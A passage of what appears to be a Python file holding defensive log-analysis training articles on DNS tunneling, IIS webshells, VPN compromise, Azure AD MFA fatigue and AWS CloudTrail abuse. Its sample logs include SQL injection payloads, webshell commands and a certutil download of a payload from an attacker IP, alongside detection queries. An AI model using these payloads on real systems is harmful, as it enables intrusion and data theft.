| 15:30:00 | - | Golden Ticket forged offline |
| 15:45:00 | 4769 | Forged TGT used (no matching 4768) |
| 16:00:00 | 4624 | Persistent access with Golden Ticket |

## Conclusions

- The attacker used Kerberoasting to crack service account passwords offline
- A compromised service account was used to perform DCSync and obtain the
  krbtgt hash
- A Golden Ticket provided persistent domain admin access
- The entire credential chain took under 2 hours
- Key detection opportunities: mass SPN requests, RC4 usage, TGS without TGT

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Credential Access |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | Credential Access |
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 | Credential Access |
| OS Credential Dumping: DCSync | T1003.006 | Credential Access |
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | Lateral Movement |
"""
    ))

    # ----------------------------------------------------------------
    # Article 8
    # ----------------------------------------------------------------
    articles.append((
        "Investigating Suspicious DNS Queries at Scale",
        ["log-analysis", "dns", "threat-hunting", "dns-tunneling", "network-analysis"],
        r"""# Investigating Suspicious DNS Queries at Scale

## Scenario Setup

Network monitoring flagged an endpoint generating an unusually high volume of DNS
queries to a single domain, with abnormally long subdomain labels. This pattern
is consistent with DNS tunneling or DNS-based C2 communication. You need to
analyze DNS logs at scale to determine if this is a data exfiltration channel
and identify all affected hosts.

**Environment:**
- Infoblox DNS appliances (primary and secondary)
- Microsoft DNS on Domain Controllers (fallback)
- Zeek DNS logs from network tap
- ~50 million DNS queries per day
- PassiveDNS enrichment available

## DNS Threat Indicators

| Indicator | Normal | Suspicious |
|-----------|--------|------------|
| Query length | < 30 chars | > 50 chars in subdomain |
| Entropy of subdomain | < 3.5 | > 4.0 (high randomness) |
| Query volume per domain | < 100/hour | > 500/hour |
| TXT record queries | < 1% | > 10% of queries to one domain |
| Unique subdomains | < 10 | > 100 to same parent domain |
| Query timing | Business hours | 24/7 constant rate |

## Sample Log Entries

### Zeek DNS log - DNS tunneling pattern

```
ts=1707558000.000 uid=CQz1 query=aGVsbG8gd29ybGQ.data.evil-tunnel[.]com
    qtype=TXT rcode=NOERROR answers=TXT "dGhpcyBpcyBhIHJlc3Bvbn..."
ts=1707558001.234 uid=CQz2 query=dGhpcyBpcyBhbm90aGVy.data.evil-tunnel[.]com
    qtype=TXT rcode=NOERROR answers=TXT "cmVzcG9uc2UgZGF0YQ..."
ts=1707558002.567 uid=CQz3 query=c2VjcmV0IGRhdGEgaGVyZQ.data.evil-tunnel[.]com
    qtype=TXT rcode=NOERROR answers=TXT "bW9yZSByZXNwb25zZQ..."
```

**Annotation:** The subdomain labels are Base64-encoded data (`aGVsbG8gd29ybGQ` =
"hello world"). Each query sends data upstream via the subdomain, and receives
data downstream in the TXT response. This is a bidirectional DNS tunnel.

### Infoblox query log - DGA (Domain Generation Algorithm) pattern

```
10-Feb-2026 09:15:33 client 10.1.0.42#55432: query: xkqmvwplrt.com IN A
10-Feb-2026 09:15:34 client 10.1.0.42#55433: query: bwnrjfhsye.com IN A
10-Feb-2026 09:15:34 client 10.1.0.42#55434: query: mtgzxcdqpk.com IN A
10-Feb-2026 09:15:35 client 10.1.0.42#55435: query: jlrfswvbnm.com IN A NXDOMAIN
10-Feb-2026 09:15:35 client 10.1.0.42#55436: query: qpwmhxkcvt.com IN A NXDOMAIN
```

**Annotation:** Rapid queries for random-looking domains, many returning NXDOMAIN.
This is characteristic of DGA malware trying to find its active C2 domain.
The high NXDOMAIN rate is a reliable detection signal.

### Legitimate but suspicious - high-volume DMARC/SPF lookups

```
10-Feb-2026 09:20:00 client 10.3.0.5#53: query: _dmarc.partner-company.com IN TXT
```

**Annotation:** Not all high-volume DNS is malicious. Mail servers generate many
TXT lookups for DMARC/SPF/DKIM. Baseline your mail server IPs to exclude them.

## Query Examples

### KQL - Detect DNS tunneling by query length and entropy

```kql
DnsEvents
| where TimeGenerated > ago(24h)
| extend SubdomainLength = strlen(tostring(split(Name, ".")[0]))
| extend DomainParts = split(Name, ".")
| extend ParentDomain = strcat(tostring(DomainParts[-2]), ".", tostring(DomainParts[-1]))
| where SubdomainLength > 30
| summarize QueryCount=count(),
            UniqueSubdomains=dcount(Name),
            AvgSubdomainLen=avg(SubdomainLength),
            SourceHosts=make_set(ClientIP)
    by ParentDomain
| where UniqueSubdomains > 50 and QueryCount > 100
| sort by QueryCount desc
```

### SPL - DGA detection by NXDOMAIN ratio

```spl
index=dns sourcetype=infoblox:dns
| rex field=query "(?<subdomain>[^.]+)\.(?<parent_domain>[^.]+\.[^.]+)$"
| stats count as total,
        count(eval(rcode="NXDOMAIN")) as nx_count,
        dc(query) as unique_queries
    by src_ip, parent_domain
| eval nx_ratio = round(nx_count/total*100, 2)
| where nx_ratio > 50 AND total > 20
| sort - nx_ratio
| table src_ip, parent_domain, total, nx_count, nx_ratio, unique_queries
```

### EQL - Rapid DNS queries to same parent domain

```eql
sequence by source.ip with maxspan=10s
  [dns where dns.question.type == "TXT"
    and dns.question.registered_domain == "evil-tunnel.com"] with runs=10
```

## Correlation Logic

**DNS tunneling detection algorithm:**

1. Parse all DNS queries into subdomain + parent domain
2. Calculate Shannon entropy of subdomain: `H = -sum(p * log2(p))` for each character frequency
3. Group by `(source_ip, parent_domain)` and compute:
   - Total query count per hour
   - Unique subdomains count
   - Average subdomain length
   - Percentage of TXT queries
   - Average entropy score
4. Score and threshold:

| Metric | Threshold | Points |
|--------|-----------|--------|
| Avg entropy > 4.0 | High randomness | 25 |
| Unique subdomains > 100/hr | Data encoding | 25 |
| Avg subdomain length > 40 | Payload in label | 20 |
| TXT query ratio > 20% | Bidirectional channel | 15 |
| Queries 24/7 (no human pattern) | Automated | 15 |

**Alert threshold: 60+ points**

**Estimated data throughput of DNS tunnel:**
- Max subdomain label: 63 chars
- Max full query: 253 chars
- Usable payload per query: ~45 bytes (Base32 encoded)
- At 1 query/second: ~162 KB/hour upstream
- TXT response can carry up to ~4KB: ~14.4 MB/hour downstream

## Timeline Reconstruction

| Time (UTC) | Event | Detail |
|------------|-------|--------|
| 08:15:22 | First tunneling query | DEVWS033 -> data.evil-tunnel[.]com TXT |
| 08:15:22 - 17:45:00 | Sustained tunnel | 34,200 queries over 9.5 hours |
| 10:22:00 | Throughput spike | Query rate increases to 5/second |
| 10:22 - 10:45 | Bulk exfil | ~365KB uploaded via subdomain encoding |
| 13:00:00 | Second host joins | ENGWS015 begins queries to same domain |
| 17:45:22 | Tunnel stops | Workstation shutdown |

## Conclusions

- DNS tunneling confirmed: 34,200 queries with Base64-encoded subdomains
- Data exfiltration estimated at ~1.5MB upstream over 9.5 hours
- Command data received: ~137MB downstream via TXT responses
- Second infected host identified through same parent domain correlation
- The tunnel operated within normal DNS traffic volume (0.07% of daily queries),
  making it invisible without specific analytics

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Application Layer Protocol: DNS | T1071.004 | Command and Control |
| Exfiltration Over Alternative Protocol | T1048 | Exfiltration |
| Dynamic Resolution: Domain Generation Algorithms | T1568.002 | Command and Control |
| Data Encoding: Standard Encoding | T1132.001 | Command and Control |
| Non-Application Layer Protocol | T1095 | Command and Control |
"""
    ))

    # ----------------------------------------------------------------
    # Article 9
    # ----------------------------------------------------------------
    articles.append((
        "Web Server Log Analysis for Exploitation and Webshells",
        ["log-analysis", "web-server", "webshell", "exploitation", "iis", "apache"],
        r"""# Web Server Log Analysis for Exploitation and Webshells

## Scenario Setup

A vulnerability scanner detected a potential webshell on a public-facing IIS web
server. The server hosts a customer portal application. You must analyze web server
access logs, IIS logs, and Windows events to determine how the webshell was
deployed, when the compromise occurred, and what actions the attacker took through
the webshell.

**Environment:**
- IIS 10 on Windows Server 2022 (WEBSRV01)
- Application: ASP.NET customer portal on port 443
- WAF: AWS ALB with AWS WAF (log to S3)
- IIS logs with W3C extended format
- Sysmon installed on the web server

## Key Log Fields for Web Exploitation

| Field | IIS Log Name | What to Look For |
|-------|-------------|-----------------|
| URI Path | cs-uri-stem | Unusual paths, uploaded files |
| Query String | cs-uri-query | SQL injection, command injection |
| HTTP Status | sc-status | 200 on suspicious paths, 500 spikes |
| Response Size | sc-bytes | Abnormally large responses (data leak) |
| User Agent | cs(User-Agent) | Scanners, curl, python-requests |
| Referrer | cs(Referer) | Missing referrer on internal pages |
| Time Taken | time-taken | Long execution = heavy commands |

## Sample Log Entries

### IIS log - SQL injection probing

```
2026-02-08 14:22:15 WEBSRV01 GET /portal/search.aspx id=1'%20OR%201=1-- 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 234
2026-02-08 14:22:16 WEBSRV01 GET /portal/search.aspx id=1'%20UNION%20SELECT%20null,null,table_name%20FROM%20information_schema.tables-- 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 1523
2026-02-08 14:22:18 WEBSRV01 GET /portal/search.aspx id=1'%20UNION%20SELECT%20null,username,password%20FROM%20dbo.users-- 443
  - 45.33.32.156 sqlmap/1.7 - 200 0 0 8445
```

**Annotation:** Classic SQL injection escalation: boolean test, schema enumeration,
then credential extraction. Note the user agent changed to `sqlmap/1.7` on the
third request, confirming automated tool usage. The response size (8445 bytes)
suggests data was returned.

### IIS log - webshell upload via file upload vulnerability

```
2026-02-08 15:10:33 WEBSRV01 POST /portal/upload.aspx - 443
  - 45.33.32.156 python-requests/2.28.0 - 200 0 0 156
```

### IIS log - webshell execution

```
2026-02-08 15:12:00 WEBSRV01 POST /portal/uploads/shell.aspx cmd=whoami 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 45
2026-02-08 15:12:05 WEBSRV01 POST /portal/uploads/shell.aspx cmd=ipconfig%20/all 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 1234
2026-02-08 15:12:15 WEBSRV01 POST /portal/uploads/shell.aspx cmd=net%20user%20/domain 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 3456
2026-02-08 15:15:00 WEBSRV01 POST /portal/uploads/shell.aspx cmd=certutil%20-urlcache%20-split%20-f%20http://45.33.32.156/beacon.exe%20C:\temp\svc.exe 443
  - 45.33.32.156 Mozilla/5.0 - 200 0 0 89
```

**Annotation:** Webshell access shows the classic post-exploitation pattern:
`whoami` (identity), `ipconfig` (network), `net user` (domain recon), then
`certutil` to download a second-stage payload.

### Sysmon - w3wp.exe spawning cmd.exe (Event ID 1)

```xml
<EventData>
  <Data Name="ParentImage">C:\Windows\System32\inetsrv\w3wp.exe</Data>
  <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
  <Data Name="CommandLine">cmd /c whoami</Data>
  <Data Name="User">IIS APPPOOL\CustomerPortal</Data>
</EventData>
```

**Annotation:** The IIS worker process (w3wp.exe) should never spawn cmd.exe.
This is definitive proof of webshell command execution.

## Query Examples

### KQL - Detect webshell access patterns

```kql
W3CIISLog
| where csUriStem matches regex @"\.aspx$|\.asp$|\.jsp$|\.php$"
| where csUriStem contains "upload" or csUriStem matches regex @"/[a-z]{4,8}\.(aspx|php|jsp)$"
| where csMethod == "POST"
| where scStatus == 200
| summarize RequestCount=count(),
            UniquePaths=dcount(csUriStem),
            Commands=make_set(csUriQuery),
            FirstSeen=min(TimeGenerated),
            LastSeen=max(TimeGenerated)
    by cIP, csUriStem
| where RequestCount > 5
| sort by RequestCount desc
```

### SPL - SQL injection detection in web logs

```spl
index=iis sourcetype=iis
| where match(cs_uri_query, "(?i)(union\s+select|or\s+1=1|'--|;drop\s+|xp_cmdshell|information_schema)")
| stats count as attempts, dc(cs_uri_stem) as target_pages,
        values(cs_uri_query) as payloads, earliest(_time) as first_attempt
    by c_ip, cs_User_Agent
| sort - attempts
| table c_ip, cs_User_Agent, attempts, target_pages, payloads, first_attempt
```

### EQL - IIS worker spawning suspicious processes

```eql
process where event.type == "start"
  and process.parent.name == "w3wp.exe"
  and process.name in ("cmd.exe", "powershell.exe", "certutil.exe",
                        "bitsadmin.exe", "net.exe", "whoami.exe")
```

## Correlation Logic

**Web compromise detection chain:**

1. **Reconnaissance**: High 404/403 rate from single IP (directory brute-force)
2. **Exploitation**: SQL injection or parameter tampering (pattern match in query strings)
3. **Upload**: POST to upload endpoint followed by new file appearing in web root
4. **Webshell Activity**: POST requests to newly created file with command parameters
5. **Post-Exploitation**: w3wp.exe spawning system utilities (Sysmon correlation)

**Detection rule: webshell upload + execution**

```
WHEN (POST to /upload* returns 200)
AND WITHIN 10 minutes (POST to new file in /uploads/ with cmd= parameter)
AND (w3wp.exe spawns cmd.exe or powershell.exe)
THEN CRITICAL alert: Webshell deployed and active
```

## Timeline Reconstruction

| Time (UTC) | Phase | Event | Source |
|------------|-------|-------|--------|
| 14:15:00 | Recon | Directory brute-force (847 requests, 95% 404) | IIS |
| 14:22:15 | Exploit | SQL injection begins on search.aspx | IIS |
| 14:22:18 | Exploit | Database credentials extracted | IIS |
| 15:10:33 | Upload | Webshell uploaded via upload.aspx | IIS |
| 15:12:00 | Webshell | whoami executed through shell.aspx | IIS + Sysmon |
| 15:12:15 | Discovery | Domain enumeration via net user | Sysmon |
| 15:15:00 | Staging | certutil downloads beacon.exe | Sysmon |
| 15:16:00 | Execution | beacon.exe executed (C2 implant) | Sysmon |

## Conclusions

- Attack chain: directory brute-force -> SQL injection -> credential theft ->
  webshell upload -> post-exploitation -> C2 implant deployment
- The WAF failed to block the SQL injection; the payload used encoding evasion
- The webshell was a simple one-liner ASP.NET command executor
- Total time from first probe to C2 implant: approximately 1 hour
- The IIS application pool identity had excessive permissions

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Server Software Component: Web Shell | T1505.003 | Persistence |
| Command and Scripting Interpreter: Windows Command Shell | T1059.003 | Execution |
| Ingress Tool Transfer | T1105 | Command and Control |
| Account Discovery: Domain Account | T1087.002 | Discovery |
"""
    ))

    # ----------------------------------------------------------------
    # Article 10
    # ----------------------------------------------------------------
    articles.append((
        "VPN Log Analysis Detecting Compromised Remote Access",
        ["log-analysis", "vpn", "remote-access", "authentication", "anomaly-detection"],
        r"""# VPN Log Analysis Detecting Compromised Remote Access

## Scenario Setup

After a breach at a partner organization, their VPN credentials database was
found on a dark web forum. Several of your employees use similar passwords across
services. You must audit VPN authentication logs to detect compromised accounts,
impossible travel scenarios, and unauthorized access patterns.

**Environment:**
- Cisco AnyConnect VPN gateway (2 concentrators: VPN01, VPN02)
- Duo MFA for VPN (but service accounts exempted)
- Azure AD conditional access for cloud VPN
- ~1,200 active VPN users, ~300 concurrent sessions typical

## VPN Threat Indicators

| Indicator | Description | Severity |
|-----------|-------------|----------|
| Impossible travel | Same account from 2 geolocations faster than physically possible | High |
| Off-hours access | Authentication outside normal business pattern | Medium |
| Concurrent sessions | Same account connected from 2+ locations | High |
| Service account VPN | svc_* accounts on VPN (should use site-to-site) | High |
| Failed then success | Brute force followed by successful auth | High |
| New device | Unrecognized device certificate or fingerprint | Medium |
| High bandwidth | Unusual data transfer volume over VPN | Medium |

## Sample Log Entries

### Cisco AnyConnect - normal session

```
Feb 10 08:30:15 VPN01 : %ASA-6-113039: Group <CorpVPN> User <a.johnson>
  IP <73.162.45.100> AnyConnect parent session started.
Feb 10 08:30:16 VPN01 : %ASA-6-716002: Group <CorpVPN> User <a.johnson>
  WebVPN session started. IP: 73.162.45.100, MFA: Duo Push Accepted
Feb 10 08:30:17 VPN01 : %ASA-6-113019: Group = CorpVPN, Username = a.johnson,
  IP = 73.162.45.100, Session Type: AnyConnect-Parent
  Assigned IP: 10.250.1.45, Duration: started
```

### Cisco AnyConnect - compromised account (impossible travel)

```
Feb 10 09:15:00 VPN01 : %ASA-6-113039: Group <CorpVPN> User <m.chen>
  IP <73.162.45.200> AnyConnect session started.    <-- New York (home IP)
Feb 10 09:15:01 VPN01 : MFA: Duo Push Accepted

Feb 10 09:45:00 VPN02 : %ASA-6-113039: Group <CorpVPN> User <m.chen>
  IP <185.220.101.33> AnyConnect session started.   <-- Moscow (Tor exit node)
Feb 10 09:45:01 VPN02 : MFA: Duo Push Timeout, Fallback: SMS Code Accepted
```

**Annotation:** Same user from New York and Moscow within 30 minutes. Physical
travel is impossible. The second session used SMS fallback instead of Duo Push,
suggesting the attacker could intercept SMS (SIM swap or SS7 attack) but could
not approve a push notification.

### Service account VPN access (should not happen)

```
Feb 10 02:33:00 VPN01 : %ASA-6-113039: Group <CorpVPN> User <svc_backup>
  IP <45.33.32.156> AnyConnect session started.
Feb 10 02:33:01 VPN01 : MFA: Exempted (service account policy)
  Assigned IP: 10.250.1.200
Feb 10 02:33:15 VPN01 : Session data: bytes_in=0, bytes_out=524288000
```

**Annotation:** Service account `svc_backup` connecting via VPN from an external
IP at 2:33 AM with no MFA. It then transferred 500MB of data. Service accounts
should use site-to-site VPN or direct connections, never user VPN.

## Query Examples

### KQL - Detect impossible travel on VPN

```kql
let vpn_auths = SigninLogs
| where AppDisplayName == "Cisco AnyConnect"
| where ResultType == 0
| extend City = tostring(LocationDetails.city),
         Country = tostring(LocationDetails.countryOrRegion),
         Lat = toreal(LocationDetails.geoCoordinates.latitude),
         Lon = toreal(LocationDetails.geoCoordinates.longitude)
| project TimeGenerated, UserPrincipalName, IPAddress, City, Country, Lat, Lon;
vpn_auths
| join kind=inner (vpn_auths | extend TimeGenerated2=TimeGenerated,
    IP2=IPAddress, City2=City, Lat2=Lat, Lon2=Lon)
    on UserPrincipalName
| where TimeGenerated2 > TimeGenerated
| extend TimeDiffMinutes = datetime_diff('minute', TimeGenerated2, TimeGenerated)
| where TimeDiffMinutes between (1 .. 240)
| extend DistanceKm = geo_distance_2points(Lon, Lat, Lon2, Lat2) / 1000
| extend SpeedKmH = DistanceKm / (TimeDiffMinutes / 60.0)
| where SpeedKmH > 900
| project UserPrincipalName, TimeGenerated, City, IP=IPAddress,
          TimeGenerated2, City2, IP2, TimeDiffMinutes,
          DistanceKm=round(DistanceKm,0), SpeedKmH=round(SpeedKmH,0)
```

### SPL - Concurrent VPN sessions from different IPs

```spl
index=vpn sourcetype=cisco:asa action=session_started
| sort 0 _time
| streamstats current=t window=2 values(src_ip) as active_ips,
    dc(src_ip) as unique_ips by user
| where unique_ips > 1
| eval concurrent=mvjoin(active_ips, ", ")
| table _time, user, concurrent, unique_ips
| sort - unique_ips
```

### EQL - Brute force followed by successful VPN auth

```eql
sequence by user.name with maxspan=30m
  [authentication where event.outcome == "failure"
    and event.provider == "cisco_asa"] with runs=5
  [authentication where event.outcome == "success"
    and event.provider == "cisco_asa"]
```

## Correlation Logic

**Impossible travel detection:**

1. Collect all successful VPN authentications with geolocation
2. For each user, calculate time difference between consecutive sessions
3. Calculate distance using the Haversine formula
4. If `distance / time > 900 km/h` (faster than commercial jet), flag as impossible

**Concurrent session detection:**

1. Track VPN session start and end events per user
2. Maintain active session state: `{user: [(ip, start_time, assigned_ip)]}`
3. On new session start, check if another session is still active for same user
4. If sessions overlap and source IPs differ, alert immediately

**MFA bypass detection:**

1. Baseline each user's MFA method (Push, SMS, TOTP)
2. Alert when MFA method changes (Push -> SMS indicates potential MFA fatigue or SIM swap)
3. Alert on MFA exemption for any account not in the approved service account list

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 09:15:00 | Legitimate VPN | VPN01 | m.chen from New York, Duo Push |
| 09:45:00 | Compromised VPN | VPN02 | m.chen from Moscow, SMS fallback |
| 09:45:30 | Lateral movement | Security | 10.250.1.201 -> FILESRV01 Type 3 |
| 09:50:00 | File access | Sysmon | Bulk file listing on Finance share |
| 10:15:00 | Data exfil | Firewall | 2.1GB outbound from 10.250.1.201 |
| 10:30:00 | Session end | VPN02 | Moscow session disconnected |
| 11:00:00 | SOC alert | SIEM | Impossible travel alert fires |

## Conclusions

- The account m.chen was compromised via credential reuse from the partner breach
- The attacker bypassed Duo MFA using SMS interception
- Impossible travel: New York to Moscow in 30 minutes (7,500 km)
- 2.1GB of data exfiltrated during the 45-minute VPN session
- The 1.5-hour gap between compromise and SOC alert was due to the SIEM
  correlation rule running on a 1-hour schedule

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Valid Accounts: Domain Accounts | T1078.002 | Initial Access |
| External Remote Services | T1133 | Initial Access |
| Multi-Factor Authentication Interception | T1111 | Credential Access |
| Remote Services: VPN | T1021.007 | Lateral Movement |
| Exfiltration Over Web Service | T1567 | Exfiltration |
"""
    ))

    # ----------------------------------------------------------------
    # Article 11
    # ----------------------------------------------------------------
    articles.append((
        "Office 365 and Azure AD Sign-In Log Analysis",
        ["log-analysis", "office-365", "azure-ad", "cloud-security", "identity"],
        r"""# Office 365 and Azure AD Sign-In Log Analysis

## Scenario Setup

Multiple users reported receiving MFA prompts they did not initiate. Azure AD
Identity Protection flagged several sign-ins as "atRisk." You must analyze
Azure AD sign-in logs, Office 365 Unified Audit Logs, and conditional access
policy evaluations to determine if accounts are compromised and assess the scope
of the attack.

**Environment:**
- Microsoft 365 E5 with Azure AD P2
- Conditional Access: require MFA for all apps, block legacy auth
- ~3,000 licensed users
- Logs forwarded to Sentinel via diagnostic settings
- Retention: 90 days in Azure AD, 365 days in Sentinel

## Key Azure AD Log Sources

| Log Source | Contains | Retention |
|------------|----------|-----------|
| Sign-in logs (interactive) | User sign-ins with MFA, CA results | 30 days native |
| Sign-in logs (non-interactive) | Token refreshes, service calls | 30 days native |
| Audit logs | Directory changes, app consent | 30 days native |
| Identity Protection | Risk detections, risky users | 90 days |
| Unified Audit Log (O365) | Mailbox, SharePoint, Teams actions | 180 days |

## Sample Log Entries

### Azure AD sign-in - MFA fatigue attack

```json
{
  "createdDateTime": "2026-02-10T08:15:00Z",
  "userPrincipalName": "a.johnson@acme.com",
  "ipAddress": "185.220.101.33",
  "location": {"city": "Amsterdam", "countryOrRegion": "NL"},
  "status": {"errorCode": 50074, "failureReason": "Strong Auth Required - MFA not completed"},
  "clientAppUsed": "Browser",
  "authenticationDetails": [
    {"authenticationMethod": "Password", "succeeded": true},
    {"authenticationMethod": "Microsoft Authenticator - push", "succeeded": false}
  ],
  "conditionalAccessStatus": "notApplied",
  "riskLevelDuringSignIn": "medium",
  "mfaDetail": {"authMethod": "Notification through mobile app"}
}
```

**Annotation:** Password succeeded but MFA push was rejected by the user. The
`riskLevelDuringSignIn: medium` indicates Azure AD detected anomalous behavior.
If repeated rapidly, this is an MFA fatigue (push bombing) attack.

### MFA fatigue success (user accidentally approved)

```json
{
  "createdDateTime": "2026-02-10T08:22:33Z",
  "userPrincipalName": "a.johnson@acme.com",
  "ipAddress": "185.220.101.33",
  "location": {"city": "Amsterdam", "countryOrRegion": "NL"},
  "status": {"errorCode": 0, "failureReason": ""},
  "authenticationDetails": [
    {"authenticationMethod": "Password", "succeeded": true},
    {"authenticationMethod": "Microsoft Authenticator - push", "succeeded": true}
  ],
  "conditionalAccessStatus": "success",
  "riskLevelDuringSignIn": "high"
}
```

**Annotation:** After 7 minutes of repeated MFA prompts, the user accidentally
approved. The risk level escalated to "high" but conditional access still allowed
the sign-in because the MFA requirement was satisfied.

### O365 Unified Audit - mailbox rule creation (persistence)

```json
{
  "CreationDate": "2026-02-10T08:25:00Z",
  "Operation": "New-InboxRule",
  "UserId": "a.johnson@acme.com",
  "ClientIP": "185.220.101.33",
  "Parameters": [
    {"Name": "Name", "Value": ".."},
    {"Name": "SubjectContainsWords", "Value": "invoice;payment;wire;transfer"},
    {"Name": "MoveToFolder", "Value": "RSS Feeds"},
    {"Name": "MarkAsRead", "Value": "True"}
  ]
}
```

**Annotation:** The attacker created a mail rule named ".." (nearly invisible)
that redirects emails containing financial keywords to the RSS Feeds folder and
marks them as read. This is BEC (Business Email Compromise) preparation.

## Query Examples

### KQL - Detect MFA fatigue attacks

```kql
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType == 50074 or ResultType == 0
| extend MFAResult = tostring(parse_json(tostring(
    AuthenticationDetails))[1].succeeded)
| summarize FailedMFA=countif(ResultType == 50074),
            SucceededMFA=countif(ResultType == 0 and MFAResult == "true"),
            SourceIPs=make_set(IPAddress),
            Locations=make_set(strcat(
                LocationDetails.city, ", ",
                LocationDetails.countryOrRegion))
    by UserPrincipalName, bin(TimeGenerated, 1h)
| where FailedMFA > 5 and SucceededMFA > 0
| extend PushBombScore = FailedMFA * 10 + SucceededMFA * 50
| sort by PushBombScore desc
```

### SPL - Suspicious mailbox rule creation

```spl
index=o365 sourcetype=o365:management:activity Operation="New-InboxRule"
| spath output=rule_name path=Parameters{}.Value
| where match(rule_name, "^\.{1,3}$") OR match(rule_name, "^\s+$")
    OR match(Parameters, "(?i)forward|redirect|delete|RSS")
| eval params=mvjoin('Parameters{}.Value', " | ")
| table _time, UserId, ClientIP, Operation, params
| sort _time
```

### EQL - Account compromise: risky sign-in then mail rule

```eql
sequence by user.name with maxspan=30m
  [authentication where event.outcome == "success"
    and signal.rule.name : "*risky*"]
  [event where event.action == "New-InboxRule"]
```

## Correlation Logic

**BEC detection workflow:**

1. **Identity compromise**: Sign-in from anomalous location with MFA fatigue
2. **Mailbox takeover**: New inbox rules, delegate access, or mail forwarding
3. **Reconnaissance**: Mass mail search for financial keywords
4. **Execution**: Fake invoice or wire transfer request sent from compromised mailbox

**Correlation query structure:**

```
Step 1: Azure AD Sign-in Logs -> Risk score > medium AND MFA method change
Step 2: Within 30 min -> O365 Audit: New-InboxRule or Set-Mailbox forwarding
Step 3: Within 1 hour -> O365 Audit: SearchQuery in mailbox
Step 4: Within 24 hours -> O365 Audit: Send mail with attachment to external
```

**Risk scoring for compromised accounts:**

| Signal | Points |
|--------|--------|
| MFA fatigue (>5 failed pushes then success) | 40 |
| Sign-in from TOR/VPN exit node | 20 |
| Impossible travel detected | 30 |
| Inbox rule created with redirect/delete | 25 |
| Mail forwarding to external address | 30 |
| Bulk mail download (MailItemsAccessed) | 15 |
| **Investigation threshold** | **50** |

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 08:15:00 | MFA prompt 1 | Azure AD | Failed push - a.johnson from Amsterdam |
| 08:16:22 | MFA prompt 2 | Azure AD | Failed push |
| 08:18:45 | MFA prompt 3 | Azure AD | Failed push |
| 08:20:11 | MFA prompt 4 | Azure AD | Failed push |
| 08:21:30 | MFA prompt 5 | Azure AD | Failed push |
| 08:22:33 | MFA approved | Azure AD | User accidentally approved push |
| 08:23:00 | Token issued | Azure AD | Access token for Office 365 |
| 08:25:00 | Inbox rule | O365 UAL | Rule ".." created (redirect financial emails) |
| 08:30:00 | Mail search | O365 UAL | Search: "wire transfer" "bank account" |
| 09:15:00 | Phishing email | O365 UAL | Fake invoice sent to CFO from a.johnson |

## Conclusions

- MFA fatigue attack succeeded after 5 push attempts over 7 minutes
- The attacker established persistence via a hidden inbox rule within 3 minutes
- BEC preparation was rapid: mail search for financial terms at 08:30
- A phishing email was sent from the compromised account to the CFO
- Number-matching MFA would have prevented the push bombing attack
- Conditional access should block sign-ins flagged as "high risk" regardless of MFA

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Valid Accounts: Cloud Accounts | T1078.004 | Initial Access |
| Multi-Factor Authentication Request Generation | T1621 | Credential Access |
| Email Hiding Rules | T1564.008 | Defense Evasion |
| Email Collection: Remote Email Collection | T1114.002 | Collection |
| Phishing: Spearphishing via Service | T1566.003 | Initial Access |
"""
    ))

    # ----------------------------------------------------------------
    # Article 12
    # ----------------------------------------------------------------
    articles.append((
        "AWS CloudTrail Deep Dive Detecting IAM Abuse",
        ["log-analysis", "aws", "cloudtrail", "iam", "cloud-security"],
        r"""# AWS CloudTrail Deep Dive Detecting IAM Abuse

## Scenario Setup

AWS GuardDuty triggered an alert for `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`
on a production EC2 instance. The alert indicates that IAM role credentials
assigned to the instance are being used from an external IP address. You must
analyze CloudTrail logs to determine the scope of the IAM abuse, what data was
accessed, and how credentials were exfiltrated.

**Environment:**
- AWS Organization with 12 accounts (prod, staging, dev, security)
- CloudTrail: organization trail to centralized S3 bucket
- All API calls logged (management + data events for S3 and Lambda)
- ~8 million CloudTrail events per day across all accounts
- Athena configured for CloudTrail log querying

## Critical CloudTrail Fields

| Field | Description | Investigation Use |
|-------|-------------|-------------------|
| eventName | API action called | What was done |
| userIdentity.type | AssumedRole, IAMUser, Root | Who did it |
| sourceIPAddress | Caller IP | Where from (internal vs external) |
| userAgent | SDK/CLI/Console | How (tool fingerprint) |
| errorCode | AccessDenied, etc. | Failed attempts (recon) |
| requestParameters | API input | What was targeted |
| responseElements | API output | What was returned |
| userIdentity.sessionContext.sessionIssuer | Role ARN | Which role |

## Sample Log Entries

### Normal - EC2 instance role API call

```json
{
  "eventTime": "2026-02-10T08:00:00Z",
  "eventName": "DescribeInstances",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/ProdAppRole/i-0abc123def456",
    "sessionContext": {
      "sessionIssuer": {
        "arn": "arn:aws:iam::123456789012:role/ProdAppRole"
      }
    }
  },
  "sourceIPAddress": "10.0.1.55",
  "userAgent": "aws-sdk-python/1.26.0"
}
```

**Annotation:** Normal behavior. The source IP is the instance's private IP
and the user agent matches the expected Python SDK used by the application.

### Suspicious - same role credentials from external IP

```json
{
  "eventTime": "2026-02-10T10:22:15Z",
  "eventName": "ListBuckets",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/ProdAppRole/i-0abc123def456"
  },
  "sourceIPAddress": "45.33.32.156",
  "userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.10.0"
}
```

**Annotation:** Same role (ProdAppRole) but from an external IP. The instance
